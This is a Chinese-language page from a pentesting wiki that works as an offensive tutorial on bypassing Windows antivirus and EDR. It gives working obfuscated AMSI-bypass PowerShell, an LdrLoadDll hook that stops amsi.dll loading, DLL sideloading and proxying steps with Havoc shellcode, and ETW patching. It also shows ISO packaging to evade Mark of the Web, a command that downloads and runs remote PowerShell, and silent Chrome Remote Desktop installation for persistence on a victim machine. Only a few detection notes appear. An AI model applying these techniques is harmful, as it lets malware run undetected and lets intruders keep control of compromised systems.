# 杀毒软件 (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于停止 Windows Defender 正常工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来使 Windows Defender 停止工作的工具。
- [如果你是管理员，禁用 Defender](basic-powershell-for-pentesters/README.md)

## **AV 绕过 方法论**

目前，AV 使用不同的方法来判断文件是否恶意：静态检测、动态分析，以及对更高级的 EDR 来说，会有行为分析。

### **静态检测**

静态检测是通过标记二进制或脚本中的已知恶意字符串或字节数组来实现的，同时也会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公开工具可能更容易被抓到，因为它们很可能已经被分析并被标记为恶意。有几种方法可以绕过这类检测：

- **加密**

如果你对二进制进行加密，AV 将无法检测你的程序，但你需要某种 loader 在内存中解密并运行程序。

- **混淆**

有时只需更改二进制或脚本中的一些字符串就能通过 AV，但这可能是耗时的，取决于你要混淆的内容。

- **自定义工具**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分为多个片段，然后让 Defender 单独扫描每个片段，这样就能确切地告诉你二进制中哪些字符串或字节被标记。

强烈建议你查看这份关于实用 AV 绕过的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指 AV 在 sandbox 中运行你的二进制并监视是否有恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这一部分可能更难处理，下面是一些可以用来规避 sandbox 的方法。

- **在执行前 sleep** 根据实现方式，这可能是绕过 AV 动态分析的好方法。AV 为了不打断用户工作流，扫描文件的时间通常很短，因此使用长时间的 sleep 可以干扰二进制的分析。问题是许多 AV 的 sandbox 可以根据实现跳过 sleep。
- **检查机器资源** 通常 sandbox 可用的资源非常少（例如 < 2GB RAM），否则会拖慢用户机器。你也可以在这里发挥创意，例如检查 CPU 温度或风扇转速，sandbox 中未必实现这些检测。
- **机器特定检查** 如果你想针对加入了 "contoso.local" 域的用户工作站，你可以检查计算机的域名是否匹配指定值，如果不匹配就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在程序执行前检查计算机名，如果匹配 HAL9TH，说明你在 Defender 的 sandbox 中，这时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源： <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗 Sandboxes 的一些很好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们在本文前面所说，**公开工具**最终会被**检测到**，所以你应该问自己一个问题：

例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你可以使用一个不那么知名但也能转储 LSASS 的项目。

正确的答案可能是后者。以 mimikatz 为例，它可能是被 AV 和 EDR 标记最多的工具之一，虽然项目本身很酷，但为了绕过 AV 与它打交道也会非常麻烦，因此寻找替代工具来实现你的目标通常更好。

> [!TIP]
> 在修改你的 payload 以规避检测时，确保在 Defender 中**关闭自动样本提交**，并且，严重提示，**不要将样本上传到 VirusTotal**，如果你的目标是长期实现规避。如果你想检查某个 payload 是否被特定 AV 检测，最好在 VM 上安装该 AV，尝试关闭自动样本提交，并在那里测试直到你满意为止。

## EXEs vs DLLs

只要可能，优先使用 **DLLs 来规避检测**。根据我的经验，DLL 文件通常**远少于 EXE 被检测**和分析，所以在某些情况下（如果你的 payload 能作为 DLL 运行的话）这是一个非常简单的规避技巧。

如图所示，Havoc 的一个 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE Payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比常规 Havoc EXE payload 与 常规 Havoc DLL</p></figcaption></figure>

下面我们将展示一些可以与 DLL 文件配合使用以提升隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，将受害应用和恶意 payload(s) 并置在一起。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 以及下面的 powershell 脚本来检查哪些程序容易受到 DLL Sideloading 的影响：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令会输出位于 "C:\Program Files\\" 中容易受到 DLL hijacking 的程序列表以及它们试图加载的 DLL 文件。

我强烈建议你**自己探索 DLL Hijackable/Sideloadable 程序**，如果正确操作，这种技术相当隐蔽，但如果你使用公开已知的 DLL Sideloadable 程序，可能会很容易被发现。

仅仅将一个恶意 DLL 放到程序期望加载的同名位置，并不会自动加载你的 payload，因为程序期望该 DLL 中包含某些特定的函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 会将程序对代理（并且是恶意）DLL 的调用转发到原始 DLL，从而保留程序的功能并能够处理执行你的 payload。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们两个文件：一个 DLL 源代码模板，以及原始已重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的检测率均为 0/26！我会称之为一次成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及观看 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入了解我们讨论的内容。

### 滥用转发导出 (ForwardSideLoading)

Windows PE 模块可以导出实际上是“forwarders”的函数：导出项不是指向代码，而是包含形式为 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用者解析该导出时，Windows loader 将：

- 如果尚未加载，则加载 `TargetDll`
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，它将从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在的目录。

这就实现了一种间接的 sideloading 原语：找到一个签名的 DLL，它导出一个被转发到非 KnownDLL 模块名称的函数，然后将该签名 DLL 与一个由攻击者控制、名称与转发目标模块完全相同的 DLL 放在同一目录下。当调用该转发导出时，loader 将解析该转发并从相同目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此它通过正常搜索顺序解析。

PoC (copy-paste):
1) 将已签名的系统 DLL 复制到一个可写的文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 将一个恶意的 `NCRYPTPROV.dll` 放在同一文件夹中。一个最小的 DllMain 就足以获得代码执行；你不需要实现被转发的函数来触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) 加载并列的 `keyiso.dll` (signed)
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会跟随转发到 `NCRYPTPROV.SetAuditingInterface`
- 然后加载器会从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你会在 `DllMain` 已经运行后才收到 "missing API" 错误

Hunting tips:
- 关注 forwarded exports，且目标模块不是 KnownDLL 的情况。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项： https://hexacorn.com/d/apis_fwd.txt

检测/防御思路：
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载签名的 DLLs，随后从该目录加载具有相同基名的非-KnownDLLs
- 对如下进程/模块链发出告警： `rundll32.exe` → 非系统的 `keyiso.dll` → `NCRYPTPROV.dll`（位于用户可写路径下）
- 强制执行代码完整性策略（WDAC/AppLocker），并在应用程序目录中阻止写入+执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避检测只是猫捉老鼠的游戏，今天有效的方法明天可能就会被检测到，所以不要仅依赖单一工具；如果可能，尽量串联多种规避技术。

## AMSI (Anti-Malware Scan Interface)

AMSI 的创建目的是防止 "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"。

最初，AV 只能扫描 **磁盘上的文件**，因此如果你能以某种方式将 payload **直接在内存中** 执行，AV 就无法阻止，因为它没有足够的可见性。

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许防病毒解决方案通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是脚本运行的可执行文件路径，在本例中为 powershell.exe。

我们没有在磁盘上写入任何文件，但仍因 AMSI 而在内存中被检测到。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 扫描。这甚至影响到使用 `Assembly.Load(byte[])` 进行内存加载执行。因此，如果你想规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低）进行内存执行。

There are a couple of ways to get around AMSI:

- **Obfuscation**

由于 AMSI 主要依赖静态检测，修改你尝试加载的脚本有时是规避检测的好方法。

然而，AMSI 有能力对多层混淆的脚本进行去混淆，因此 obfuscation 的效果取决于实施方式，可能不是好选择。这使得规避并非那么直接。尽管有时仅需改几个变量名就能通过，这取决于被标记的严重程度。

- **AMSI Bypass**

由于 AMSI 通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程来实现，即使以非特权用户运行也可以轻易篡改它。正因为 AMSI 实现上的这个缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不会启动扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，微软已经开发了相应的检测签名以阻止广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码就可以使当前的 powershell 进程无法使用 AMSI。 当然，这行代码本身会被 AMSI 标记，因此要使用该技术需要进行一些修改。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 取得的一个修改过的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，其思路是定位 amsi.dll 中 "AmsiScanBuffer" 函数的地址（该函数负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它。这样，实际扫描的结果会返回 0，被解释为清洁的结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。

还有许多其他使用 powershell 绕过 AMSI 的技术，请查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. 一种健壮且语言无关的绕过方法是在 `ntdll!LdrLoadDll` 上放置用户模式钩子，当请求加载的模块为 `amsi.dll` 时让其返回错误。这样，AMSI 永远不会加载，该进程也不会执行任何扫描。

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- 适用于 PowerShell、WScript/CScript 和自定义加载器（任何会加载 AMSI 的情形）。
- 配合通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）以避免过长的命令行痕迹。
- 已见于通过 LOLBins 执行的加载器（例如，`regsvr32` 调用 `DllRegisterServer`）。

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**移除检测到的签名**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 之类的工具，从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程内存以查找 AMSI 签名，然后用 NOP 指令覆盖它，从而将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**
如果使用 PowerShell 版本 2，AMSI 不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志记录

PowerShell logging 是一个功能，允许记录系统上执行的所有 PowerShell 命令。对于审计和故障排查很有用，但对于想要规避检测的攻击者来说也可能是一个**问题**。

要绕过 PowerShell 日志记录，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**: 你可以使用诸如 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 之类的工具来实现这一目的。
- **Use Powershell version 2**: 如果使用 PowerShell version 2，AMSI 将不会被加载，因此你可以运行脚本而不被 AMSI 扫描。可以这样运行：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防御的 powershell 会话（这就是 `powerpick` 来自 Cobal Strike 所使用的方法）。


## 混淆

> [!TIP]
> 一些混淆技术依赖于加密数据，这会增加二进制文件的熵，使 AVs 和 EDRs 更容易检测到它。对此要小心，或许只对代码中敏感或需要隐藏的特定部分应用加密。

### 反混淆受 ConfuserEx 保护的 .NET 二进制文件

在分析使用 ConfuserEx 2（或商业分支）的恶意软件时，通常会遇到多层保护，这些保护会阻止反编译器和沙箱。下面的工作流程可以可靠地**恢复接近原始的 IL**，之后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  反防篡改移除 – ConfuserEx 会加密每个 *method body* 并在 *module* 的静态构造函数 (`<Module>.cctor`) 内解密。它还会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个反防篡改参数（`key0-key3`, `nameHash`, `internKey`），在构建你自己的解包器时可能有用。

2.  符号 / 控制流 恢复 – 将 *clean* 文件输入到 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
标志：
• `-p crx` – 选择 ConfuserEx 2 配置文件  
• de4dot 会撤销控制流扁平化，恢复原始命名空间、类和变量名，并解密常量字符串。

3.  代理调用移除 – ConfuserEx 用轻量级包装器（即 *proxy calls*）替换直接方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将它们移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该会看到常见的 .NET API（如 `Convert.FromBase64String` 或 `AES.Create()`），而不是不透明的包装函数（如 `Class8.smethod_10` 等）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位 *真实* 有效载荷。恶意软件通常将其作为 TLV 编码的字节数组初始化在 `<Module>.byte_0` 中。

上述流程在不需要运行恶意样本的情况下**恢复执行流**——这在离线工作站上工作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可作为 IOC 用于自动分类样本。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件的分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 添加由 C++ 模板元编程框架生成的一层混淆操作，这将使试图破解应用程序的人的工作变得更困难一些。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 PE 文件，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个针对任意可执行文件的简单变形（metamorphic）代码引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM 支持语言的精细化代码混淆框架，使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP chains 在汇编级别对程序进行混淆，从而破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 然后加载它们

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要通过基于声誉的方式工作，这意味着很少被下载的应用程序会触发 SmartScreen，从而提醒并阻止最终用户执行该文件（尽管可以通过点击 More Info -> Run anyway 仍然执行该文件）。

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 重要的是要注意：用 **受信任的** 签名证书签署的可执行文件 **不会触发 SmartScreen**。

一个非常有效的方法来防止你的 payloads 获得 Mark of The Web 是将它们打包到某种容器中，例如 ISO。这是因为 Mark-of-the-Web (MOTW) **不能** 应用于 **非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器以规避 Mark-of-the-Web 的工具。

示例用法：
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志记录机制，允许应用程序和系统组件**记录事件**。然而，它也可以被安全产品用来监控并检测恶意活动。

类似于 AMSI 被禁用（绕过）的方式，也可以让用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这是通过在内存中修补该函数使其立即返回来完成的，从而有效地禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 和 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 中找到更多信息。


## C# Assembly Reflection

将 C# 二进制直接加载到内存中已经被研究了很长时间，仍然是运行你的 post-exploitation 工具而不被 AV 发现的一个非常好的方式。

因为 payload 会直接加载到内存而不接触磁盘，我们只需要担心为整个进程修补 AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但有不同的方法可以做到这一点：

- **Fork\&Run**

它涉及到**产生一个新的牺牲进程**，将你的 post-exploitation 恶意代码注入到该新进程中，执行你的恶意代码，完成后杀死该新进程。这个方法既有优点也有缺点。fork and run 方法的优点是执行发生在我们 Beacon implant process **之外**。这意味着如果我们的 post-exploitation 行动出现问题或被发现，我们的 **implant 存活的几率** 会**大得多**。缺点是被 **Behavioural Detections** 发现的几率也会**更大**。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

是将 post-exploitation 恶意代码**注入到其自身进程**中。这样，你可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出现问题，**丢失 beacon** 的几率会**大得多**，因为它可能会崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想了解更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，参见 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所述，通过让受害机器访问 **安装在 Attacker Controlled SMB share 上的解释器环境**，可以使用其他语言来执行恶意代码。

允许访问 SMB 共享上的 Interpreter Binaries 和环境后，你可以在被攻陷机器的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等语言，我们对绕过静态签名有**更大的灵活性**。在这些语言中使用随机未混淆的 reverse shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操作访问令牌或像 EDR 或 AV 这样的安全产品**的技术，使它们降低权限，从而进程不会终止但没有权限去检查恶意活动。

为防止这种情况，Windows 可以**阻止外部进程**获取安全进程令牌的句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博文**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，在受害者 PC 上部署 Chrome Remote Desktop 并使用它来接管和维持持久访问是很容易的：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 对应的 MSI 文件以下载 MSI 文件。
2. 在受害机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击 next。向导会要求你授权；点击 Authorize 按钮继续。
4. 以略作调整的参数执行以下命令：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许在不使用 GUI 的情况下设置 PIN）。

## Advanced Evasion

Evasion 是一个非常复杂的主题，有时你必须在单个系统中考虑许多不同的遥测来源，因此在成熟的环境中基本上不可能完全不被发现。

你面对的每个环境都会有其自身的强项和弱点。

强烈建议你去观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这个演讲，以了解更多 Advanced Evasion 技术的入门内容。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是 [@mariuszbit](https://twitter.com/mariuszbit) 关于 Evasion in Depth 的另一个很棒的演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **旧技术**

### **检查 Defender 认为哪些部分是恶意的**

